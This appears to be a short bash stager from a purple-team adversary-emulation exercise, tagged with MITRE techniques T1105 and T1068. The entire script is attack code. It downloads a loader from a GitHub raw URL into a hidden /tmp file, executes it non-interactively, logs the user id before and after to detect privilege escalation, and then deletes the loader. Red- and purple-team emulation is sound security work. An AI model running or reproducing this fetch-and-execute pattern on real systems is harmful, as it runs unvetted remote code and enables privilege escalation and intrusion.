#!/bin/bash
# Purple Team A1 - Stage 2: staged download from operator-controlled GitHub (T1105 + T1068)
# T1105: loader fetched from Refaelyk/purple-team-a1; exploit runs inline non-interactively
LOG=/tmp/purple_team_a1_runlog.txt
echo "[A1 S2] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_before=$(id)" >> $LOG

GH_RAW="https://raw.githubusercontent.com/Refaelyk/purple-team-a1/master"

# T1105: download the loader from operator-controlled GitHub
curl -fsSL "$GH_RAW/exploit_s2.sh" -o /tmp/.a1_s2_loader.sh 2>&1 | tee -a $LOG
chmod +x /tmp/.a1_s2_loader.sh
echo "[A1 S2] $(date -u +%Y-%m-%dT%H:%M:%SZ) loader downloaded, executing" >> $LOG
bash /tmp/.a1_s2_loader.sh 2>&1 | tee -a $LOG
echo "[A1 S2] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_after=$(id)" >> $LOG

# cleanup
rm -f /tmp/.a1_s2_loader.sh
